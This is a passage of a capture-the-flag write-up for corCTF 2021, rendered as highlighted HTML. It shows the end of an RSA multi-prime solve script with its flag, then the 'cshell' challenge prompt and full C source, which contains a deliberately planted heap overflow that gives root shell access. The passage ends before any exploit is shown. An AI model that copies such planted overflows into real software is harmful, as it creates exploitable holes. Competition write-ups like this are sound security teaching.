+</span><span>c </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">15640629897212089539145769625632189125456455778939633021487666539864477884226491831177051620671080345905237001384943044362508550274499601386018436774667054082051013986880044122234840762034425906802733285008515019104201964058459074727958015931524254616901569333808897189148422139163755426336008738228206905929505993240834181441728434782721945966055987934053102520300610949003828413057299830995512963516437591775582556040505553674525293788223483574494286570201177694289787659662521910225641898762643794474678297891552856073420478752076393386273627970575228665003851968484998550564390747988844710818619836079384152470450659391941581654509659766292902961171668168368723759124230712832393447719252348647172524453163783833358048230752476923663730556409340711188698221222770394308685941050292404627088273158846156984693358388590950279445736394513497524120008211955634017212917792675498853686681402944487402749561864649175474956913910853930952329280207751998559039169086898605565528308806524495500398924972480453453358088625940892246551961178561037313833306804342494449584581485895266308393917067830433039476096285467849735814999851855709235986958845331235439845410800486470278105793922000390078444089105955677711315740050638
+</span><span>primes </span><span style="color:#f29e74;">= </span><span>[</span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(x</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&quot; = &quot;</span><span>)[</span><span style="color:#ffcc66;">1</span><span>]) </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">open</span><span>(</span><span style="color:#bae67e;">&quot;primes.txt&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;r&quot;</span><span>)</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">read</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">split</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)]
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">prod</span><span>(</span><span style="color:#ffcc66;">lst</span><span>):
+</span><span>	ret </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">1
+</span><span>	</span><span style="color:#ffa759;">for </span><span>num </span><span style="color:#ffa759;">in </span><span>lst:
+</span><span>		ret </span><span style="color:#f29e74;">*= </span><span>num
+</span><span>	</span><span style="color:#ffa759;">return </span><span>ret
+</span><span>phi </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">prod</span><span>([x</span><span style="color:#f29e74;">-</span><span style="color:#ffcc66;">1 </span><span style="color:#ffa759;">for </span><span>x </span><span style="color:#ffa759;">in </span><span>primes])
+</span><span>d </span><span style="color:#f29e74;">= </span><span>gmpy</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">invert</span><span>(</span><span style="color:#ffcc66;">65537</span><span style="color:#ccc9c2cc;">, </span><span>phi)
+</span><span style="color:#f28779;">print</span><span>(</span><span style="color:#ffd580;">long_to_bytes</span><span>(</span><span style="color:#f28779;">pow</span><span>(c</span><span style="color:#ccc9c2cc;">, </span><span>d</span><span style="color:#ccc9c2cc;">, </span><span>N)))
+</span></code></pre>
+<p>Running that gives us the flag corctf{to0_m4ny_pr1m3s55_63aeea37a6b3b22f}</p>
+<h1 id="cshell"><a href="/corctf-2021/cshell">cshell</a></h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>My friend Hevr thinks I can&#39;t code, so I decided to prove him wrong by making a restricted shell in which he is unable to play squad. I must add that my programming skills are very cache money...
+</span><span>nc pwn.be.ax 5001
+</span></code></pre>
+<p>We're provided a binary and source.</p>
+<h4 id="cshell-c">Cshell.c</h4>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span>##include </span><span style="color:#f29e74;">&lt;</span><span>stdio</span><span style="color:#f29e74;">.</span><span>h</span><span style="color:#f29e74;">&gt;
+</span><span>##include </span><span style="color:#f29e74;">&lt;</span><span>stdlib</span><span style="color:#f29e74;">.</span><span>h</span><span style="color:#f29e74;">&gt;
+</span><span>##include </span><span style="color:#f29e74;">&lt;</span><span>string</span><span style="color:#f29e74;">.</span><span>h</span><span style="color:#f29e74;">&gt;
+</span><span>##include </span><span style="color:#f29e74;">&lt;</span><span>unistd</span><span style="color:#f29e74;">.</span><span>h</span><span style="color:#f29e74;">&gt;
+</span><span>##include </span><span style="color:#f29e74;">&lt;</span><span>crypt</span><span style="color:#f29e74;">.</span><span>h</span><span style="color:#f29e74;">&gt;
+</span><span style="font-style:italic;color:#5c6773;">//gcc Cshell.c -static -lcrypt -o Cshell
+</span><span style="color:#ffa759;">struct </span><span style="color:#73d0ff;">users </span><span>{
+</span><span>	</span><span style="color:#ffa759;">char</span><span> name[</span><span style="color:#ffcc66;">8</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> passwd[</span><span style="color:#ffcc66;">35</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>}</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">struct </span><span style="color:#73d0ff;">tracker</span><span>{
+</span><span>	</span><span style="color:#ffa759;">struct </span><span style="color:#73d0ff;">tracker</span><span> *next</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">struct </span><span style="color:#73d0ff;">users</span><span> *ptr</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> name[</span><span style="color:#ffcc66;">8</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">long int</span><span> id</span><span style="color:#ccc9c2cc;">;
+</span><span>}</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span> alex_buff</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span> Charlie_buff</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span> Johnny_buff</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span> Eric_buff</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">struct</span><span> users </span><span style="color:#f29e74;">*</span><span>user</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">struct</span><span> users </span><span style="color:#f29e74;">*</span><span>root</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">struct</span><span> tracker </span><span style="color:#f29e74;">*</span><span>root_t</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">struct</span><span> tracker </span><span style="color:#f29e74;">*</span><span>user_t</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>username[</span><span style="color:#ffcc66;">8</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>userbuffer</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">int</span><span> uid</span><span style="color:#f29e74;">=</span><span style="color:#ffcc66;">1000</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">int</span><span> length</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char</span><span> salt[</span><span style="color:#ffcc66;">5</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;1337</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>hash</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">setup</span><span>(){
+</span><span>	</span><span style="color:#ffa759;">char</span><span> password_L[</span><span style="color:#ffcc66;">33</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Welcome to Cshell, a very restricted shell.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Please create a profile.&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Enter a username up to 8 characters long.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%8s</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>username)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Welcome to the system </span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">, you are our 3rd user. We used to have more but some have deleted their accounts.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Create a password.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span style="color:#ccc9c2cc;">,</span><span>username)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%32s</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>password_L)</span><span style="color:#ccc9c2cc;">;
+</span><span>	hash </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">crypt</span><span>(password_L</span><span style="color:#ccc9c2cc;">,</span><span>salt)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;How many characters will your bio be (200 max)?</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%d</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>length)</span><span style="color:#ccc9c2cc;">;
+</span><span>	userbuffer </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(length </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">8</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Great, please type your bio.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">getchar</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">fgets</span><span>((userbuffer </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">8</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">201</span><span style="color:#ccc9c2cc;">,</span><span>stdin)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">logout</span><span>(){
+</span><span>	</span><span style="color:#f28779;">fflush</span><span>(stdin)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">getchar</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">struct</span><span> tracker </span><span style="color:#f29e74;">*</span><span>ptr</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Username:&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> username_l[</span><span style="color:#ffcc66;">9</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> password_l[</span><span style="color:#ffcc66;">32</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>hash</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%8s</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>username_l)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">for </span><span>(ptr </span><span style="color:#f29e74;">=</span><span> root_t</span><span style="color:#ccc9c2cc;">;</span><span> ptr </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">NULL</span><span style="color:#ccc9c2cc;">;</span><span> ptr </span><span style="color:#f29e74;">=</span><span> root_t</span><span style="color:#f29e74;">-&gt;</span><span>next) {
+</span><span>        </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f28779;">strcmp</span><span>(ptr</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span> username_l) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>		</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Password:&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	    </span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%32s</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>password_l)</span><span style="color:#ccc9c2cc;">;
+</span><span>	    hash </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">crypt</span><span>(password_l</span><span style="color:#ccc9c2cc;">,</span><span>salt)</span><span style="color:#ccc9c2cc;">;
+</span><span>	    </span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f28779;">strcmp</span><span>(hash</span><span style="color:#ccc9c2cc;">,</span><span>ptr</span><span style="color:#f29e74;">-&gt;</span><span>ptr</span><span style="color:#f29e74;">-&gt;</span><span>passwd) </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>){
+</span><span>		    </span><span style="color:#f28779;">strcpy</span><span>(username</span><span style="color:#ccc9c2cc;">,</span><span>ptr</span><span style="color:#f29e74;">-&gt;</span><span>name)</span><span style="color:#ccc9c2cc;">;
+</span><span>		    uid </span><span style="color:#f29e74;">=</span><span> ptr</span><span style="color:#f29e74;">-&gt;</span><span>id</span><span style="color:#ccc9c2cc;">;
+</span><span>		    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Authenticated!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		    </span><span style="color:#ffd580;">menu</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	    }
+</span><span>	    </span><span style="color:#ffa759;">else</span><span>{
+</span><span>		    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Incorrect&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		    </span><span style="color:#ffd580;">logout</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	    }
+</span><span>			 
+</span><span>        }
+</span><span>	</span><span style="color:#ffa759;">else
+</span><span>	{
+</span><span>		</span><span style="color:#ffa759;">if </span><span>(ptr</span><span style="color:#f29e74;">-&gt;</span><span>next</span><span style="color:#f29e74;">==</span><span style="color:#ffcc66;">0</span><span>)
+</span><span>		{
+</span><span>			</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Sorry no users with that name.&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>			</span><span style="color:#ffd580;">logout</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		}
+</span><span>	}
+</span><span>    }
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">whoami</span><span>(){
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">, uid: </span><span style="color:#ffcc66;">%d</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>username</span><span style="color:#ccc9c2cc;">,</span><span>uid)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">menu</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">bash</span><span>(){
+</span><span>	</span><span style="color:#ffa759;">if </span><span>(uid </span><span style="color:#f29e74;">== </span><span style="color:#ffcc66;">0</span><span>){
+</span><span>		</span><span style="color:#f28779;">system</span><span>(</span><span style="color:#bae67e;">&quot;bash&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>	</span><span style="color:#ffa759;">else 
+</span><span>	{
+</span><span>		</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Who do you think you are?&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">squad</span><span>(){
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;..&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">menu</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">banner</span><span>(){
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;       /</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;      {.-}&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;     ;_.-&#39;</span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;    {    _.}_&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;    </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">.-&#39; /  `,&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;     </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">  |    /&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;      </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;"> |  ,/&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;       </span><span style="color:#95e6cb;">\\</span><span style="color:#bae67e;">|_/&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">menu</span><span>(){
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;+----------------------+&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;|        Commands      |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;+----------------------+&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;| 1. logout            |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;| 2. whoami            |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;| 3. bash (ROOT ONLY!) |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;| 4. squad             |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;| 5. exit              |&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;+----------------------+&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">int</span><span> option</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Choice &gt; &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">scanf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%i</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>option)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">switch</span><span>(option){
+</span><span>		</span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#ffd580;">logout</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">2</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#ffd580;">whoami</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">3</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#ffd580;">bash</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">4</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#ffd580;">squad</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">case </span><span style="color:#ffcc66;">5</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>		</span><span style="color:#ffa759;">default</span><span style="color:#ccc9c2cc;">:
+</span><span>			</span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;[!] invalid choice </span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>			</span><span style="color:#ffa759;">break</span><span style="color:#ccc9c2cc;">;
+</span><span>	}
+</span><span>}
+</span><span style="color:#ffa759;">void </span><span style="color:#ffd580;">history</span><span>(){
+</span><span>	alex_buff </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffcc66;">0x40</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> alex_data[</span><span style="color:#ffcc66;">0x40</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Alex</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Just a user on this system.</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> Johnny[</span><span style="color:#ffcc66;">0x50</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Johnny</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;"> Not sure why I am a user on this system.</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> Charlie[</span><span style="color:#ffcc66;">0x50</span><span>] </span><span style="color:#f29e74;">=</span><span style="color:#bae67e;">&quot;Charlie</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">I do not trust the security of this program...</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffa759;">char</span><span> Eric[</span><span style="color:#ffcc66;">0x60</span><span>] </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;Eric</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">This is one of the best programs I have ever used!</span><span style="color:#95e6cb;">\0</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(alex_buff</span><span style="color:#ccc9c2cc;">,</span><span>alex_data)</span><span style="color:#ccc9c2cc;">;
+</span><span>	Charlie_buff </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffcc66;">0x50</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(Charlie_buff</span><span style="color:#ccc9c2cc;">,</span><span>Charlie)</span><span style="color:#ccc9c2cc;">;
+</span><span>	Johnny_buff </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffcc66;">0x60</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(Johnny_buff</span><span style="color:#ccc9c2cc;">,</span><span>Johnny)</span><span style="color:#ccc9c2cc;">;
+</span><span>	Eric_buff </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffcc66;">0x80</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(Eric_buff</span><span style="color:#ccc9c2cc;">,</span><span>Eric)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">free</span><span>(Charlie_buff)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">free</span><span>(Eric_buff)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span><span style="color:#ffa759;">int </span><span style="color:#ffd580;">main</span><span>(){
+</span><span>	</span><span style="color:#f28779;">setvbuf</span><span>(stdout</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0 </span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2 </span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">setvbuf</span><span>(stdin</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0 </span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">2 </span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	root_t </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffa759;">sizeof</span><span>(</span><span style="color:#ffa759;">struct</span><span> tracker))</span><span style="color:#ccc9c2cc;">;
+</span><span>	user_t </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffa759;">sizeof</span><span>(</span><span style="color:#ffa759;">struct</span><span> tracker))</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">history</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#ffd580;">banner</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>	user </span><span style="color:#f29e74;">= </span><span style="color:#f28779;">malloc</span><span>(</span><span style="color:#ffa759;">sizeof</span><span>(</span><span style="color:#ffa759;">struct</span><span> users )</span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">4</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	root </span><span style="color:#f29e74;">=</span><span> user </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(user</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;tempname&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(user</span><span style="color:#f29e74;">-&gt;</span><span>passwd</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;placeholder&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(root</span><span style="color:#f29e74;">-&gt;</span><span>name</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;root&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>	</span><span style="color:#f28779;">strcpy</span><span>(root</span><span style="color:#f29e74;">-&gt;</span><span>passwd</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;guessme:)&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
